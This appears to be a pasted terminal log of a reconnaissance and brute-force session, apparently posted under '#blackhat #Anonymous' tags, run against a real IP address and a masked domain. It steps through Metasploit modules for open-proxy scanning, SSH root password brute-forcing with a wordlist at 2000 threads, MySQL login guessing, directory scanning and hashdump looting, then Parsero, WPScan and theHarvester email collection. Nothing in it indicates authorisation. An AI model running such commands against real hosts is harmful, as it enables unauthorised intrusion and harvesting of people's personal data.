+[*] Scanned 243 of 256 hosts (94% complete)
+[*] Scanned 250 of 256 hosts (97% complete)
+[*] Scanned 252 of 256 hosts (98% complete)
+[*] Scanned 256 of 256 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+USE OPEN_PROXY
+
+msf auxiliary(tnslsnr_version) > use auxiliary/scanner/http/open_proxy
+
+msf auxiliary(open_proxy) > show options
+
+msf auxiliary(open_proxy) > show options
+
+Module options (auxiliary/scanner/http/open_proxy):
+
+   Name                   Current Setting                                     Required  Description
+   ----                   ---------------                                     --------  -----------
+   LOOKUP_PUBLIC_ADDRESS  false                                               no        Enable test for retrieve public IP address via RIPE.net
+   MULTIPORTS             false                                               no        Multiple ports will be used : 80, 1080, 3128, 8080, 8123
+   RANDOMIZE_PORTS        false                                               no        Randomize the order the ports are probed
+   RHOSTS                                                                     yes       The target address range or CIDR identifier
+   RPORT                  8080                                                yes       The target port
+   SITE                   www.google.com                                      yes       The web site to test via alleged web proxy (default is www.google.com)
+   THREADS                1                                                   yes       The number of concurrent threads
+   UserAgent              Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)  yes       The HTTP User-Agent sent in the request
+   VERIFY_CONNECT         false                                               no        Enable test for CONNECT method
+   VERIFY_HEAD            false                                               no        Enable test for HEAD method
+   ValidCode              200,302                                             no        Valid HTTP code for a successfully request
+   ValidPattern           server: gws                                         no        Valid HTTP server header for a successfully request
+
+msf auxiliary(open_proxy) > set LOOKUP_PUBLIC_ADDRESS true
+LOOKUP_PUBLIC_ADDRESS => true
+msf auxiliary(open_proxy) > set MULTIPORTS true
+MULTIPORTS => true
+msf auxiliary(open_proxy) > show options
+
+Module options (auxiliary/scanner/http/open_proxy):
+
+   Name                   Current Setting                                     Required  Description
+   ----                   ---------------                                     --------  -----------
+   LOOKUP_PUBLIC_ADDRESS  true                                                no        Enable test for retrieve public IP address via RIPE.net
+   MULTIPORTS             true                                                no        Multiple ports will be used : 80, 1080, 3128, 8080, 8123
+   RANDOMIZE_PORTS        false                                               no        Randomize the order the ports are probed
+   RHOSTS                                                                     yes       The target address range or CIDR identifier
+   RPORT                  8080                                                yes       The target port
+   SITE                   www.google.com                                      yes       The web site to test via alleged web proxy (default is www.google.com)
+   THREADS                1                                                   yes       The number of concurrent threads
+   UserAgent              Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)  yes       The HTTP User-Agent sent in the request
+   VERIFY_CONNECT         false                                               no        Enable test for CONNECT method
+   VERIFY_HEAD            false                                               no        Enable test for HEAD method
+   ValidCode              200,302                                             no        Valid HTTP code for a successfully request
+   ValidPattern           server: gws                                         no        Valid HTTP server header for a successfully request
+
+msf auxiliary(open_proxy) > set RANDOMIZE_PORTS true
+RANDOMIZE_PORTS => true
+msf auxiliary(open_proxy) > set RHOSTS 198.71.232.3
+RHOSTS => 198.71.232.3
+msf auxiliary(open_proxy) > set RPORT 8080
+RPORT => 8080
+msf auxiliary(open_proxy) > run
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(open_proxy) > 
+
+
+USE SSH_LOGIN
+
+msf auxiliary(open_proxy) > use auxiliary/scanner/ssh/ssh_login
+msf auxiliary(ssh_login) > set RHOSTS 198.71.232.3
+RHOSTS => 198.71.232.3
+msf auxiliary(ssh_login) > set USERNAME root
+USERNAME => root
+msf auxiliary(ssh_login) > set PASS_FILE /root/Desktop/rockyou.txt
+PASS_FILE => /root/Desktop/rockyou.txt
+msf auxiliary(ssh_login) > set THREADS 2000
+THREADS => 2000
+msf auxiliary(ssh_login) > run
+
+[*] 198.71.232.3:22 SSH - Starting bruteforce
+[-] 198.71.232.3:22 SSH - Could not connect: The connection timed out (198.71.232.3:22).
+[-] 198.71.232.3:22 SSH - Could not connect: The connection timed out (198.71.232.3:22).
+[-] 198.71.232.3:22 SSH - Could not connect: The connection timed out (198.71.232.3:22).
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+USE AUXILIARY DIR_SCANNER
+
+msf auxiliary(ssh_login) > use auxiliary/scanner/http/dir_scanner
+msf auxiliary(dir_scanner) > set THREADS 50
+THREADS => 50
+msf auxiliary(dir_scanner) > set RHOSTS 198.71.232.3
+RHOSTS => 198.71.232.3
+msf auxiliary(dir_scanner) > exploit
+
+[*] Detecting error code
+[*] Using code '404' as not found for 198.71.232.3
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(dir_scanner) > set RHOSTS www.target!.com
+RHOSTS => www.target!.com
+msf auxiliary(dir_scanner) > exploit
+
+[*] Detecting error code
+[*] Using code '404' as not found for 198.71.232.3
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(dir_scanner) > set RHOSTS target!.com
+RHOSTS => target!.com
+msf auxiliary(dir_scanner) > exploit
+
+[*] Detecting error code
+[*] Using code '404' as not found for 198.71.232.3
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(dir_scanner) > 
+
+
+USE EMAIL_COLLECTOR
+
+msf auxiliary(dir_scanner) > use auxiliary/gather/search_email_collector
+
+msf auxiliary(search_email_collector) > set DOMAIN target!.com
+
+DOMAIN => target!.com
+
+msf auxiliary(search_email_collector) > run
+
+[*] Harvesting emails .....
+[*] Searching Google for email addresses from target!.com
+[*] Extracting emails from Google search results...
+[*] Searching Bing email addresses from target!.com
+[*] Extracting emails from Bing search results...
+[*] Searching Yahoo for email addresses from target!.com
+[*] Extracting emails from Yahoo search results...
+[*] Located 0 email addresses for target!.com
+[*] Auxiliary module execution completed
+
+
+msf auxiliary(search_email_collector) > use auxiliary/scanner/mysql/mysql_login
+msf auxiliary(mysql_login) > show options
+
+Module options (auxiliary/scanner/mysql/mysql_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   PASSWORD                           no        A specific password to authenticate with
+   PASS_FILE                          no        File containing passwords, one per line
+   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             3306             yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   USERNAME                           no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false            no        Try the username as the password for all users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+msf auxiliary(mysql_login) > set RHOSTS target!.com
+RHOSTS => target!.com
+msf auxiliary(mysql_login) > run
+
+[-] 198.71.232.3:3306 MYSQL - Unable to connect: The connection timed out (198.71.232.3:3306).
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(mysql_login) > 
+
+msf  auxiliary(mysql_login) > creds 
+
+msf auxiliary(mysql_login) > sessions -l
+
+Active sessions
+===============
+
+No active sessions.
+
+
+USE LOOT 
+
+msf > loot -h
+
+Usage: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]
+
+  -t <type1,type2>  Search for a list of types
+  -h,--help         Show this help information
+  -S,--search       Search string to filter by
+
+Here’s an example of how one would populate the database with some ‘loot’.
+
+msf  exploit(usermap_script) > use post/linux/gather/hashdump 
+msf  post(hashdump) > show options
+
+msf post(hashdump) > loot
+
+Loot
+====
+
+host  service  type  name  content  info  path
+----  -------  ----  ----  -------  ----  ----
+
+USE AUXILIARY SCANNER HTTP CRAWLER
+
+msf post(hashdump) > use auxiliary/scanner/http/crawler
+msf auxiliary(crawler) > set RHOST target!.com
+RHOST => target!.com
+msf auxiliary(crawler) > run
+
+[*] Crawling http://target!.com:80/...
+[*] [00001/00500]    301 - target!.com - http://target!.com/ -> http://www.target!.com/
+[*] Crawl of http://target!.com:80/ complete
+[*] Auxiliary module execution completed
+
+msf auxiliary(crawler) > 
+
+[*] Done.
+
+CHECK THE SITE WITH PARSERO
+
+┌─[root@parrot]─[~]
+└──╼ #parsero -u www.target!.com
+
+	  ____                               
+	 |  _ \ __ _ _ __ ___  ___ _ __ ___  
+	 | |_) / _` | '__/ __|/ _ \ '__/ _ \ 
+	 |  __/ (_| | |  \__ \  __/ | | (_) |
+	 |_|   \__,_|_|  |___/\___|_|  \___/ 
+
+Starting Parsero v0.75 (https://github.com/behindthefirewalls/Parsero) at 05/29/16 19:59:04
+Parsero scan report for www.target!.com
+http://www.target!.com/images/ 404 Not Found
+http://www.target!.com/_temp/ 404 Not Found
+http://www.target!.com/statshistory/ 404 Not Found
+http://www.target!.com/_backup/ 404 Not Found
+http://www.target!.com/Flash/ 404 Not Found
+http://www.target!.com/stats/ 404 Not Found
+http://www.target!.com/plugins/ 404 Not Found
+http://www.target!.com/_mygallery/ 404 Not Found
+http://www.target!.com/_tempalbums/ 404 Not Found
+http://www.target!.com/dbboon/ 404 Not Found
+http://www.target!.com/cache/ 404 Not Found
+http://www.target!.com/scripts/ 404 Not Found
+http://www.target!.com/mobile/ 200 OK
+http://www.target!.com/_tmpfileop/ 404 Not Found
+http://www.target!.com/QSC/ 404 Not Found
+
+[+] 15 links have been analyzed and 1 of them are available!!!
+
+Finished in 2.3001761436462402 seconds
+
+
+http://www.target!.com/mobile/ 200 OK
+
+
+CHECK THE SITE WITH WPSCAN
+
+┌─[root@parrot]─[~]
+└──╼ #wpscan --url www.target!.com/mobile --enumerate u
+_______________________________________________________________
+        __          _______   _____                  
+        \ \        / /  __ \ / ____|                 
+         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team 
+                       Version 2.9
+          Sponsored by Sucuri - https://sucuri.net
+   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
+_______________________________________________________________
+
+
+[!] The remote website is up, but does not seem to be running WordPress.
+
+COLLECT ALL THE EMAIL WITH THEHARVESTER
+
+┌─[root@parrot]─[~]
+└──╼ #theharvester -d target!.com -b all -n -c -t -l 50 -h
+
+*******************************************************************
+*                                                                 *
+* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
+* | __| '_ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
+* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
+*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
+*                                                                 *
+* TheHarvester Ver. 2.7                                           *
+* Coded by Christian Martorella                                   *
+* Edge-Security Research                                          *
+* cmartorella@edge-security.com                                   *
+*******************************************************************
+
+
+Full harvest..
+[-] Searching in Google..
+	Searching 0 results...
+[-] Searching in PGP Key server..
+[-] Searching in Bing..
+	Searching 50 results...
+[-] Searching in Exalead..
+	Searching 50 results...
+	Searching 100 results...
+
+
+[+] Emails found:
+------------------
+pixel-146454504959172-web-@target!.com
+
+[+] Hosts found in search engines:
+------------------------------------
+[-] Resolving hostnames IPs... 
+198.71.232.3:www.target!.com
+
+[+] Starting active queries:
+[-]Performing reverse lookup in :198.71.232.0/24
+Error in DNS resolvers
+
+DONE
+
+#blackhat #Anonymous #GLOBAL
